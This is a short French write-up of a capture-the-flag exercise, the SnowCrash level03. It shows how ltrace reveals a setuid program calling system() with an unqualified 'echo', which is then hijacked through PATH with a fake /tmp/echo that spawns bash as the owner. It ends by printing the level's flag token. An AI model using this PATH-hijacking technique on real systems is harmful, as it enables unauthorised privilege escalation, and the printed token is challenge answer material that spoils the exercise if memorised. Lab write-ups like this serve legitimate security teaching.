Un trouve un exécutable nommé level03 qui, quand lancé, nous affiche "Exploit me". On lance donc ltrace pour comprendre ce que fait le programme.

<pre><code>$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580
getegid()                                             = 2003
geteuid()                                             = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)   = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)   = 0
system("/usr/bin/env echo Exploit me"Exploit me
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                     = 0
+++ exited (status 0) +++</code></pre>

Le programme fait appel à system pour lancer la commande echo. On peut donc créer notre propre version de echo qui lancera /bin/bash avec les droits de l'owner. Pour cela il faut creer notre fichier echo et remplacer le path pour qu'il soit appelé :

<pre><code>$ echo "/bin/bash" > /tmp/echo
$ chmod 777 /tmp/echo
$ export PATH=/tmp:$PATH</code></pre>

On lance ensuite le programme :

<pre><code>level03@SnowCrash:~$ ./level03
bash: /home/user/level03/.bashrc: Permission denied
flag03@SnowCrash:~$</code></pre>

On voit que notre user a changé, nous sommes maintenant flag03

<pre><code>$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus</code></pre>

https://opensource.com/article/20/4/linux-binary-analysis
https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code
